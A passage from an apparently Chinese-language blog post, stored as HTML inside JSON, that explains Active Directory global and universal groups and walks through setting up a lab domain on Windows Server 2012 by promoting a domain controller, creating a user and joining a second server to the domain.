Group）</strong>：</p>\n<ul>\n<li>全局组用于组织和管理用户和计算机。</li>\n<li>可以将用户添加到全局组中，然后将全局组添加到安全组或域本地组中，从而为他们分配访问资源的权限。</li>\n<li>全局组的权限范围跨越整个域，适用于跨域资源访问的权限管理。</li>\n</ul>\n</li>\n<li>\n<p><strong>通用组（Universal Group）</strong>：</p>\n<ul>\n<li>通用组是一种特殊类型的组，可以跨域使用。</li>\n<li>可以将全局组、域本地组或其他通用组添加到通用组中，从而创建具有跨域权限的组。</li>\n<li>通用组通常用于复杂的跨域资源访问场景，如多域架构或跨域信任环境下的权限管理。</li>\n</ul>\n<h3 id=\"域环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#域环境搭建\">#</a> 域环境搭建</h3>\n<p>winservser12-ad 10.10.10.137</p>\n<p>winserver12 10.10.10.12</p>\n<p>12ad 安装 Active Directory 域服务</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303161445246.png\" alt=\"image-20240303161445246\"></p>\n</li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162103134.png\" alt=\"image-20240303162103134\"></p>\n<p>点击将此服务器提升为域控制器</p>\n<p>创建一个新林</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162255653.png\" alt=\"image-20240303162255653\"></p>\n<p>创建密码</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162407087.png\" alt=\"image-20240303162407087\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162608011.png\" alt=\"image-20240303162608011\"></p>\n<p>重启后显示 YUNYI 输入设置的密码</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303163345745.png\" alt=\"image-20240303163345745\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303163434498.png\" alt=\"image-20240303163434498\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303163503532.png\" alt=\"image-20240303163503532\"></p>\n<p>创建成功，创建一个新用户 test12</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170230723.png\" alt=\"image-20240303170230723\"></p>\n<p>接着把 12servser4 的 dns 设置成 ad 的 ip</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170514382.png\" alt=\"image-20240303170514382\"></p>\n<p>设置隶属于 yunyi.io 输入刚才创建的用户 test12 然后重启</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170622943.png\" alt=\"image-20240303170622943\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170725741.png\" alt=\"image-20240303170725741\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303171037565.png\" alt=\"image-20240303171037565\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303171338213.png\" alt=\"image-20240303171338213\"></p>\n",
            "tags": []
        }
    ]
}